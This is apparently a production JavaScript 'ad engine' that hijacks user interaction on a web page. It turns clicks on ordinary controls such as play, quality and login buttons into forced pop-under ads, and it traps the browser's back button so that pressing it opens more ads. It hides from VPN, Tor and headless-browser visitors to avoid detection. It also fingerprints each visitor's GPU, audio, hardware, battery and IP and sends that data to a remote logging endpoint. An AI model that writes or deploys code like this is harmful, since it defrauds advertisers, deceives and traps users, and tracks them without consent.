/**
 * v1.3.1-REBIRTH - PRODUCTION (GitHub CDN)
 * ========================================
 * Ad engine with double-layer VPN detection, DNA fingerprinting, and instant click.
 * Back-button hijack with interaction bypass. No ad-block detection or overlays.
 */

const CHACHA_CONFIG = {
    DEBUG_MODE: false,

    LINKS: [
        "https://www.blackbox.ai/", "https://chat.deepseek.com/", "https://chatgpt.com/",
        "https://www.theverge.com/tech", "https://tech.com.pk/", "https://techcrunch.com/",
        "https://www.techmeme.com/", "https://rocketpay.co.in/", "https://www.api.org/", "https://www.ibm.com/",
        "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in",
        "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in", "https://rocketpay.co.in"
    ],

    APIS: {
        FB_URL: "YOUR_FIREBASE_URL",
        TG_TOKEN: "YOUR_BOT_TOKEN",
        TG_ID: "YOUR_CHAT_ID"
    },

    SETTINGS: {
        MAX_CLICKS_TODAY: 9,
        CLEAN_PAGE: "https://cloudaccesshq.xyz/limit-reached"
    }
};

// ============================================================================
// PRE-BUILD ON PAGE LOAD
// ============================================================================

const _baskets = {
    h: CHACHA_CONFIG.LINKS.slice(0, 10),
    n: CHACHA_CONFIG.LINKS.slice(10, 16),
    l: CHACHA_CONFIG.LINKS.slice(16, 20)
};

const _validIds = [
    'tag-btn-play-main', 'tag-input-message-field', 'tag-btn-back-button',
    'tag-btn-server-shift-2', 'tag-btn-q-360', 'tag-btn-q-720', 'tag-btn-q-1080', 'tag-btn-q-4k',
    'tag-btn-auth-login', 'tag-btn-auth-send', 'tag-link-community-rules', 'tag-btn-community-showmore'
];

const _STORAGE_KEY = '_mc_rebirth_';

// ----------------------------------------------------------------------------
// DOUBLE-LAYER VPN DETECTION (Hybrid Model)
// ----------------------------------------------------------------------------

var _vpnFlag = false;
var _ipData = null;
var _dnaCache = null;

function _layer1InstantCheck() {
    var ua = navigator.userAgent || '';
    if (navigator.webdriver === true) return true;
    if (/HeadlessChrome|PhantomJS|Selenium|Puppeteer|Electron/i.test(ua)) return true;
    if (navigator.plugins && navigator.plugins.length === 0 && navigator.languages && navigator.languages.length === 0) return true;
    if (window.chrome && !window.chrome.runtime && /Chrome/i.test(ua)) return true;
    return false;
}

function _layer2DeepCheck() {
    fetch('https://ipapi.co/json/')
        .then(function(r) { return r.json(); })
        .catch(function() { return {}; })
        .then(function(data) {
            _ipData = {
                ip: data.ip || '0.0.0.0',
                proxy: !!(data.proxy),
                vpn: !!(data.vpn),
                tor: !!(data.tor)
            };
            if (data.proxy || data.vpn || data.tor) _vpnFlag = true;
        });
}

function _isVPNUser() {
    if (_vpnFlag) return true;
    if (_layer1InstantCheck()) return true;
    return false;
}

function _initVPNLayers() {
    if (_layer1InstantCheck()) {
        _vpnFlag = true;
    }
    _layer2DeepCheck();
}

// ----------------------------------------------------------------------------
// DNA COLLECTION (runs in background - never delays click)
// ----------------------------------------------------------------------------

function _collectGPU() {
    try {
        var canvas = document.createElement('canvas');
        var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (!gl) return { vendor: 'N/A', renderer: 'N/A' };
        var ext = gl.getExtension('WEBGL_debug_renderer_info');
        if (!ext) return { vendor: 'N/A', renderer: 'N/A' };
        return {
            vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) || 'N/A',
            renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) || 'N/A'
        };
    } catch (e) { return { vendor: 'N/A', renderer: 'N/A' }; }
}

function _collectHardware() {
    return {
        ram: navigator.deviceMemory || 'N/A',
        cores: navigator.hardwareConcurrency || 'N/A',
        pixelRatio: window.devicePixelRatio || 1
    };
}

function _collectAudioFingerprint() {
    try {
        var Ctx = window.AudioContext || window.webkitAudioContext;
        if (!Ctx) return 'N/A';
        var ctx = new Ctx();
        var osc = ctx.createOscillator();
        var ana = ctx.createAnalyser();
        var gain = ctx.createGain();
        gain.gain.value = 0;
        osc.connect(ana);
        ana.connect(gain);
        gain.connect(ctx.destination);
        osc.start(0);
        var arr = new Float32Array(ana.frequencyBinCount);
        ana.getFloatFrequencyData(arr);
        osc.stop();
        ctx.close();
        var h = 0;
        for (var i = 0; i < Math.min(arr.length, 32); i++) {
            h = ((h << 5) - h) + (arr[i] || 0) | 0;
        }
        return Math.abs(h).toString(36);
    } catch (e) { return 'N/A'; }
}

function _getDNA() {
    if (_dnaCache) return _dnaCache;
    _dnaCache = {
        gpu: _collectGPU(),
        hardware: _collectHardware(),
        audio: _collectAudioFingerprint(),
        battery: 'N/A',
        ip: (_ipData && _ipData.ip) || '0.0.0.0',
        vpn: _vpnFlag,
        ts: new Date().toISOString()
    };
    if (navigator.getBattery) {
        navigator.getBattery().catch(function() { return null; }).then(function(b) {
            if (b) _dnaCache.battery = Math.round(b.level * 100) + '%';
        });
    }
    return _dnaCache;
}

// ----------------------------------------------------------------------------
// STORAGE & DATE
// ----------------------------------------------------------------------------

function _getStore() {
    try {
        var raw = localStorage.getItem(_STORAGE_KEY);
        return raw ? JSON.parse(raw) : { c: 0, lastClickDate: null, lastAdId: null };
    } catch (e) { return { c: 0, lastClickDate: null, lastAdId: null }; }
}

function _setStore(s) {
    try { localStorage.setItem(_STORAGE_KEY, JSON.stringify(s)); } catch (e) {}
}

function _today() {
    return new Date().toISOString().slice(0, 10);
}

// ----------------------------------------------------------------------------
// LINK SELECTION (80/10/10 + ANTI-REPEAT)
// ----------------------------------------------------------------------------

function _pickLink(bucket) {
    var store = _getStore();
    var today = _today();

    if (store.lastClickDate !== today) {
        store.c = 0;
        store.lastClickDate = today;
        store.lastAdId = null;
    }

    var luck = Math.random() * 100;
    var pool = bucket || (luck < 80 ? _baskets.h : luck < 90 ? _baskets.n : _baskets.l);
    var fresh = pool.filter(function(u) { return u !== store.lastAdId; });
    if (fresh.length === 0) fresh = pool;

    var pick = fresh[Math.floor(Math.random() * fresh.length)];
    if (pick === store.lastAdId) {
        fresh = pool.filter(function(u) { return u !== pick; });
        pick = fresh.length ? fresh[Math.floor(Math.random() * fresh.length)] : pool[0];
    }
    return { url: pick, store: store };
}

// ----------------------------------------------------------------------------
// JUMP (direct open, referrer preserved)
// ----------------------------------------------------------------------------

function _jump(url) {
    var w = window.open(url, '_blank');
    if (w) {
        try { w.opener = null; w.focus(); } catch (e) {}
    } else {
        var a = document.createElement('a');
        a.href = url;
        a.target = '_blank';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
    }
}

// ----------------------------------------------------------------------------
// LOG (async, never blocks)
// ----------------------------------------------------------------------------

function _logAsync(btnId, url, count) {
    var dna = _getDNA();
    if (CHACHA_CONFIG.DEBUG_MODE) console.log('[REBIRTH]', { btn: btnId, link: url, click: count, dna: dna });
    if (CHACHA_CONFIG.APIS.FB_URL && CHACHA_CONFIG.APIS.FB_URL.indexOf('http') === 0) {
        fetch(CHACHA_CONFIG.APIS.FB_URL + '/logs.json', {
            method: 'POST',
            body: JSON.stringify({ btn: btnId, dna: dna, target: url, click: count, ts: new Date().toISOString() })
        }).catch(function() {});
    }
}

// ----------------------------------------------------------------------------
// FIRE AD
// ----------------------------------------------------------------------------

function _fireAd(btnId, fromBack) {
    var result = _pickLink(fromBack ? _baskets.l : null);
    var url = result.url;
    var store = result.store;

    store.c += 1;
    store.lastClickDate = _today();
    store.lastAdId = url;
    _setStore(store);

    _jump(url);
    _logAsync(btnId || 'back-hijack', url, store.c);
}

// ----------------------------------------------------------------------------
// HISTORY HIJACK (Back → Low bucket ad) - Interaction Bypass
// ----------------------------------------------------------------------------

function _initHistoryTrap() {
    var url = window.location.href;
    window.history.pushState({ page: 1 }, '', url);
    window.history.pushState({ page: 2 }, '', url);
}

function _onPopState() {
    var url = window.location.href;
    window.history.pushState({ page: 1 }, '', url);
    window.history.pushState({ page: 2 }, '', url);

    if (_isVPNUser()) return;

    var store = _getStore();
    var today = _today();

    if (store.lastClickDate !== today) {
        store.c = 0;
        store.lastClickDate = today;
        store.lastAdId = null;
        _setStore(store);
    }

    if (store.c < CHACHA_CONFIG.SETTINGS.MAX_CLICKS_TODAY) {
        _fireAd('back-hijack', true);
    }
}

// ----------------------------------------------------------------------------
// CLICK HANDLER (instant fire, VPN kill-switch)
// ----------------------------------------------------------------------------

function _onClick(e) {
    var t = e.target;
    var btn = t.closest ? t.closest('[id]') : (t.id ? t : null);
    if (!btn || !btn.id || _validIds.indexOf(btn.id) === -1) return;

    if (_isVPNUser()) return;

    var store = _getStore();
    var today = _today();

    if (store.lastClickDate !== today) {
        store.c = 0;
        store.lastClickDate = today;
        store.lastAdId = null;
        _setStore(store);
    }

    if (store.c >= CHACHA_CONFIG.SETTINGS.MAX_CLICKS_TODAY) {
        if (!CHACHA_CONFIG.DEBUG_MODE) {
            window.location.href = CHACHA_CONFIG.SETTINGS.CLEAN_PAGE;
            return;
        }
        if (CHACHA_CONFIG.DEBUG_MODE) console.warn('[REBIRTH] Daily cap reached.');
        return;
    }

    _fireAd(btn.id, false);
}

// ============================================================================
// INIT (runs on window load - main thread)
// ============================================================================

function _init() {
    _initVPNLayers();
    setTimeout(function() { _getDNA(); }, 0);
    _initHistoryTrap();
    window.addEventListener('popstate', _onPopState, false);
    document.addEventListener('click', _onClick, false);
}

if (document.readyState === 'loading') {
    window.addEventListener('load', _init);
} else {
    _init();
}
